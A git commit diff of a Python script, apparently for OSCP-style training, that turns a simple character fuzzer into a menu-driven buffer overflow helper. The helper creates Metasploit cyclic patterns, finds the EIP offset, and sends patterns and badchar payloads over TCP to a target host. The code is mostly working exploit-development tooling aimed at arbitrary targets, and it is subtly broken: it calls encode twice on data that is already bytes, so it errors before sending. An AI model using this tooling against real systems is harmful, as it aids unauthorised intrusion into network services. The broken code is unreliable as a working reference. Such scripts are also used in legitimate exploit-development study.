5509131a3fed73b7c77732f1bdc52c6abbd42923
theozin <110571215+teteco@users.noreply.github.com>
2023-05-26 14:21:20 -0300

    Update buffer_overflow_fuzzing.py

--- buffer_overflow_fuzzing.py
+++ buffer_overflow_fuzzing.py
@@ -1,40 +1,72 @@
 import socket
+import os
 
-# Solicita ao usuário o endereço IP e a porta do alvo
-target_ip = input("Insira o endereço IP do alvo: ")
-target_port = int(input("Insira a porta do alvo: "))
-
-# Lista de caracteres para fuzzing
-fuzz_chars = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
-              'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
-
-# Loop de fuzzing
-for char in fuzz_chars:
-    # Cria um payload com o caractere repetido várias vezes
-    payload = char * 1000
-    
-    # Obtém o tamanho do payload em bytes
-    payload_size = len(payload.encode())
-    
-    # Cria o socket TCP
+def send_payload(target_ip, target_port, payload):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
+
     try:
-        # Conecta-se ao alvo
         sock.connect((target_ip, target_port))
-        
-        # Envie o payload
         sock.send(payload.encode())
-        
-        # Aguarde a resposta 
         response = sock.recv(1024)
-        
-        # Verifique se há comportamento anormal na resposta 
-        if "crash" in response.decode():
-            print(f"Encontrada uma possível vulnerabilidade com o caractere: {char}")
-            print(f"Tamanho do payload: {payload_size} bytes")
-    except:
+        print(response.decode())
+    except Exception as e:
         print(f"Não foi possível conectar-se ao alvo: {target_ip}:{target_port}")
-    
-    # Fecha o socket
+        print(f"Mensagem de erro: {str(e)}")
+
     sock.close()
+
+def create_pattern_menu():
+    pattern_length = int(input("Informe o tamanho do padrão: "))
+
+    # Comando para criar o padrão com o pattern_create
+    create_pattern_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {pattern_length}"
+    pattern = os.popen(create_pattern_cmd).read().strip()
+
+    target_ip = input("Informe o endereço IP do alvo: ")
+    target_port = int(input("Informe a porta do alvo: "))
+
+    send_payload(target_ip, target_port, pattern.encode())
+
+def determine_offset_menu():
+    pattern = input("Informe o padrão enviado anteriormente: ")
+    eip_value = input("Informe o valor do EIP encontrado na aplicação: ")
+
+    # Comando para determinar o offset com o pattern_offset
+    determine_offset_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {eip_value}"
+    offset = os.popen(determine_offset_cmd).read().strip()
+
+    print(f"Offset encontrado: {offset}")
+
+    target_ip = input("Informe o endereço IP do alvo: ")
+    target_port = int(input("Informe a porta do alvo: "))
+
+    # Valor fixo "BBBB"
+    payload = "BBBB"
+
+    badchars = input("Informe os badchars a serem enviados: ")
+    payload += badchars
+
+    send_payload(target_ip, target_port, payload.encode())
+
+def main_menu():
+    while True:
+        print("\n-- Menu --")
+        print("1. Criar padrão e enviar para o alvo")
+        print("2. Determinar offset e enviar badchars")
+        print("3. Sair")
+
+        choice = input("Escolha uma opção: ")
+        if choice == "1":
+            create_pattern_menu()
+        elif choice == "2":
+            determine_offset_menu()
+        elif choice == "3":
+            break
+        else:
+            print("Opção inválida!")
+
+def main():
+    main_menu()
+
+if __name__ == "__main__":
+    main()
